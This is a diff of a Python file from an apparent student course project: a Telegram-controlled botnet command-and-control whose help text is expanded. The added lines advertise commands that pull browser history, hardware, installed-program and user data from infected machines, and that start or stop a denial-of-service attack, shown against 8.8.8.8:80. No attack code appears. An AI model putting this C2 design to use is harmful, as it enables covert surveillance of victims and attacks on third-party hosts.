@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 #
 # ifrn/2023.2/programacao_para_redes/projeto/requisicoes.py
-# Copyright (C) 2023  Sidney Pedro
+# Copyright (C) 2023-2024  Sidney Pedro
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -87,27 +87,45 @@ def responder_mensagem(retorno: dict):
 Digite `./c2 -h` para obter a lista de comandos válidos"""
     elif (mensagem == "./c2 -h"):
         retorno["text"] = f"""Uso: `./c2 [OPÇÃO] [ARGUMENTO]...`
-Comando e Controle (C2) da _botnet_ do Projeto de ProgRedes 2023.2.
+Comando e Controle (C2) da _botnet_ do Projeto de ProgRedes 2023.2
 
 Opções:
-` -h           ` Exibe essa mensagem
+` -h           ` Exibir ajuda (comandos disponíveis, exemplos
+`              ` de uso, etc.)
 ` -q ID        ` Finaliza o daemon do servidor ou de uma
 `              ` máquina conectada identificada por `ID` (o ID do
 `              ` servidor é `0`)
 ` -d ID        ` Lista informações de hardware de uma máquina
 `              ` conectada identificada por `ID`
 ` -p ID        ` Lista programas instalados em uma máquina
+`              ` conectada identificada por `ID` (essa ação pode
+`              ` levar alguns minutos até ser concluída)
+` -b ID        ` Obtém os últimos 200 itens do histórico de 
+`              ` navegação dos navegadores de uma máquina
 `              ` conectada identificada por `ID`
-` -b ID        ` Obtem histórico de navegação dos navegadores
-`              ` de uma máquina conectada identificada por `ID`
-` -u ID        ` Obtem informações do usuário logado de uma
+` -u ID        ` Obtém informações do usuário logado de uma
 `              ` máquina conectada identificada por `ID`
 ` -l           ` Lista de máquinas conectadas (ID's, endereços,
 `              ` IP, tempo online, etc.)
-` -s AÇÃO HOST ` Reservado
+` -n AÇÃO SOCK ` Realiza Negação de Serviço (leia os exemplos de
+`              ` uso abaixo). Valores válidos para `AÇÃO` são
+`              ` `iniciar` e `parar`. O argumento `SOCK` deve
+`              ` seguir o formato `IP:PORTA`
 
 Exemplos:
-` ./c2 -h      ` Pede informações do C2"""
+` ./c2 -h                    ` Solicitando instruções de uso
+`                            ` do C2
+` ./c2 -q 0                  ` Finaliza o servidor
+` ./c2 -q 4                  ` Finaliza o cliente `4`
+` ./c2 -b 1                  ` Obtendo os últimos 200 itens
+`                            ` do histórico de navegação do
+`                            ` cliente `1`
+` ./c2 -n iniciar 8.8.8.8:80 ` Iniciando Negação de Serviço
+`                            ` contra a porta `80` da máquina
+`                            ` `8.8.8.8`
+` ./c2 -n parar 8.8.8.8:80   ` Parando Negação de Serviço
+`                            ` contra a porta `80` da máquina
+`                            ` `8.8.8.8`"""
 
     if (len(mensagem) < 2048):
         requests.post(f"{TELEGRAM_API}/sendMessage", data=retorno)
